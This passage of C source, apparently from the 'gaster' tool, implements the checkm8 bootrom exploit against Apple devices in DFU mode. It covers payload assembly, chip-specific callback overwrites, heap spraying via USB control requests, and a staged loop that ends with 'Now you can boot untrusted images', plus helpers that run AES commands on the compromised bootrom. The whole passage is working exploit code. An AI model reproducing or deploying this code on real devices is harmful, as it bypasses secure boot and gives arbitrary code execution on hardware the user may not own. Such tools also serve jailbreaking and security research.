				memcpy(data + data_sz, payload_handle_checkm8_request, payload_handle_checkm8_request_sz);
				data_sz += payload_handle_checkm8_request_sz;
				handle_checkm8_request.handle_interface_request = handle_interface_request;
				handle_checkm8_request.insecure_memory_base = insecure_memory_base;
				handle_checkm8_request.exec_magic = EXEC_MAGIC;
				handle_checkm8_request.done_magic = DONE_MAGIC;
				handle_checkm8_request.memc_magic = MEMC_MAGIC;
				handle_checkm8_request.memcpy_addr = memcpy_addr;
				handle_checkm8_request.usb_core_do_transfer = usb_core_do_transfer;
				memcpy(data + data_sz, &handle_checkm8_request, sizeof(handle_checkm8_request));
				data_sz += sizeof(handle_checkm8_request);
			} else {
				memset(notA9_armv7.pwnd, '\0', sizeof(notA9_armv7.pwnd));
				memcpy(notA9_armv7.pwnd, pwnd_str, strlen(pwnd_str));
				notA9_armv7.payload_dest = payload_dest_armv7;
				notA9_armv7.dfu_handle_bus_reset = (uint32_t)dfu_handle_bus_reset;
				notA9_armv7.dfu_handle_request = (uint32_t)dfu_handle_request;
				notA9_armv7.payload_off = (uint32_t)(payload_sz + sizeof(notA9_armv7));
				notA9_armv7.payload_sz = (uint32_t)(payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request_armv7));
				notA9_armv7.memcpy_addr = (uint32_t)memcpy_addr;
				notA9_armv7.gUSBSerialNumber = (uint32_t)gUSBSerialNumber;
				notA9_armv7.usb_create_string_descriptor = (uint32_t)usb_create_string_descriptor;
				notA9_armv7.usb_serial_number_string_descriptor = (uint32_t)usb_serial_number_string_descriptor;
				memcpy(data + data_sz, &notA9_armv7, sizeof(notA9_armv7));
				data_sz += sizeof(notA9_armv7);
				memcpy(data + data_sz, payload_handle_checkm8_request, payload_handle_checkm8_request_sz);
				data_sz += payload_handle_checkm8_request_sz;
				handle_checkm8_request_armv7.handle_interface_request = (uint32_t)handle_interface_request;
				handle_checkm8_request_armv7.insecure_memory_base = (uint32_t)insecure_memory_base;
				handle_checkm8_request_armv7.exec_magic = (uint32_t)EXEC_MAGIC;
				handle_checkm8_request_armv7.done_magic = (uint32_t)DONE_MAGIC;
				handle_checkm8_request_armv7.memc_magic = (uint32_t)MEMC_MAGIC;
				handle_checkm8_request_armv7.memcpy_addr = (uint32_t)memcpy_addr;
				handle_checkm8_request_armv7.usb_core_do_transfer = (uint32_t)usb_core_do_transfer;
				memcpy(data + data_sz, &handle_checkm8_request_armv7, sizeof(handle_checkm8_request_armv7));
				data_sz += sizeof(handle_checkm8_request_armv7);
			}
			overwrite = NULL;
			overwrite_sz = 0;
			if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8003 || cpid == 0x8000) {
				memset(&checkm8_overwrite, '\0', sizeof(checkm8_overwrite));
				checkm8_overwrite.callback.callback = insecure_memory_base;
				overwrite = &checkm8_overwrite;
				overwrite_sz = sizeof(checkm8_overwrite);
			} else if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
				if(checkm8_usb_request_stall(handle) && checkm8_usb_request_leak(handle)) {
					memset(&checkm8_overwrite, '\0', sizeof(checkm8_overwrite));
					checkm8_overwrite.callback.callback = nop_gadget;
					checkm8_overwrite.callback.next = insecure_memory_base;
					overwrite = &checkm8_overwrite;
					overwrite_sz = sizeof(checkm8_overwrite);
				}
			} else {
				memset(&checkm8_overwrite_armv7, '\0', sizeof(checkm8_overwrite_armv7));
				checkm8_overwrite_armv7.callback.callback = (uint32_t)insecure_memory_base;
				overwrite = &checkm8_overwrite_armv7;
				overwrite_sz = sizeof(checkm8_overwrite_armv7);
			}
			if(overwrite != NULL && send_usb_control_request(handle, 2, 3, 0, 0x80, overwrite, overwrite_sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
				ret = true;
				for(i = 0; ret && i < data_sz; i += packet_sz) {
					packet_sz = MIN(data_sz - i, DFU_MAX_TRANSFER_SZ);
					ret = send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, &data[i], packet_sz, NULL);
				}
				if(ret) {
					send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN, NULL);
					send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, 0, NULL);
					dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_SYNC);
					dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST);
					dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_WAIT_RESET);
				}
			}
			free(data);
		}
	}
	return ret;
}

bool
checkm8_exploit(usb_handle_t *handle) {
	enum {
		STAGE_RESET,
		STAGE_SETUP,
		STAGE_SPRAY,
		STAGE_PATCH,
		STAGE_PWNED
	} stage = STAGE_RESET;
	bool ret, pwned;

	init_usb_handle(handle, APPLE_VID, DFU_MODE_PID);
	while(stage != STAGE_PWNED && wait_usb_handle(handle, checkm8_check_usb_device, &pwned)) {
		if(!pwned) {
			if(stage == STAGE_RESET) {
				puts("Stage: RESET");
				ret = checkm8_stage_reset(handle);
				stage = STAGE_SETUP;
			} else if(stage == STAGE_SETUP) {
				puts("Stage: SETUP");
				ret = checkm8_stage_setup(handle);
				stage = STAGE_SPRAY;
			} else if(stage == STAGE_SPRAY) {
				puts("Stage: SPRAY");
				ret = checkm8_stage_spray(handle);
				stage = STAGE_PATCH;
			} else {
				puts("Stage: PATCH");
				ret = checkm8_stage_patch(handle);
				stage = STAGE_RESET;
			}
			if(ret) {
				puts("ret: true");
			} else {
				puts("ret: false");
				stage = STAGE_RESET;
			}
			reset_usb_handle(handle);
		} else {
			stage = STAGE_PWNED;
			puts("Now you can boot untrusted images.");
		}
		close_usb_handle(handle);
	}
	return stage == STAGE_PWNED;
}

bool
gaster_reset_command(usb_handle_t *handle) {
	init_usb_handle(handle, APPLE_VID, DFU_MODE_PID);
	if(wait_usb_handle(handle, NULL, NULL)) {
		send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
		reset_usb_handle(handle);
		close_usb_handle(handle);
		return true;
	}
	return false;
}

bool
gaster_command(usb_handle_t *handle, void *request_data, size_t request_len, uint8_t **response, size_t response_len) {
	transfer_ret_t transfer_ret;
	bool ret = false;

	if(wait_usb_handle(handle, NULL, NULL)) {
		if(dfu_send_data(handle, request_data, request_len) && (*response = malloc(response_len)) != NULL) {
			if(send_usb_control_request(handle, 0xA1, 2, 0xFFFF, 0, *response, response_len, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_OK && transfer_ret.sz == response_len) {
				ret = true;
			} else {
				free(*response);
			}
		}
		close_usb_handle(handle);
	}
	return ret;
}

bool
gaster_aes(usb_handle_t *handle, uint32_t cmd, const uint8_t *src, uint8_t *dst, size_t len, uint32_t options) {
	struct {
		uint32_t magic_0, magic_1, func, pad, r[8];
	} exec_cmd_armv7;
	uint8_t data[DFU_MAX_TRANSFER_SZ], *response;
	struct {
		uint64_t magic, func, x[8];
	} exec_cmd;
	uint32_t r_armv7;
	size_t data_sz;
	uint64_t r;

	if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8003 || cpid == 0x8000 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
		exec_cmd.magic = EXEC_MAGIC;
		exec_cmd.func = aes_crypto_cmd;
		exec_cmd.x[0] = cmd;
		exec_cmd.x[1] = insecure_memory_base + 9 * sizeof(r);
		exec_cmd.x[2] = insecure_memory_base + 2 * sizeof(r);
		exec_cmd.x[3] = len;
		exec_cmd.x[4] = options;
		exec_cmd.x[5] = 0;
		exec_cmd.x[6] = 0;
		memcpy(data, &exec_cmd, sizeof(exec_cmd) - sizeof(r));
		data_sz = sizeof(exec_cmd) - sizeof(r);
		memcpy(data + data_sz, src, len);
		data_sz += len;
	} else {
		exec_cmd_armv7.magic_0 = (uint32_t)EXEC_MAGIC;
		exec_cmd_armv7.magic_1 = (uint32_t)EXEC_MAGIC;
		exec_cmd_armv7.func = (uint32_t)aes_crypto_cmd;
		exec_cmd_armv7.pad = 0;
		exec_cmd_armv7.r[0] = cmd;
		exec_cmd_armv7.r[1] = (uint32_t)(insecure_memory_base + 11 * sizeof(r_armv7));
		exec_cmd_armv7.r[2] = (uint32_t)(insecure_memory_base + 4 * sizeof(r_armv7));
		exec_cmd_armv7.r[3] = (uint32_t)len;
		exec_cmd_armv7.r[4] = options;
		exec_cmd_armv7.r[5] = 0;
		exec_cmd_armv7.r[6] = 0;
		memcpy(data, &exec_cmd_armv7, sizeof(exec_cmd_armv7) - sizeof(r_armv7));
		data_sz = sizeof(exec_cmd_armv7) - sizeof(r_armv7);
		memcpy(data + data_sz, src, len);
		data_sz += len;
	}
	if(gaster_command(handle, data, data_sz, &response, len + 2 * sizeof(r))) {
		memcpy(&r, response, sizeof(r));
		if(r != DONE_MAGIC) {
			free(response);
			return false;
		}
		memcpy(&r, response + sizeof(r), sizeof(r));
		if((uint32_t)r != 0) {
			free(response);
			return false;
		}
		memcpy(dst, response + 2 * sizeof(r), len);
		free(response);
		return true;
	}
	return false;
}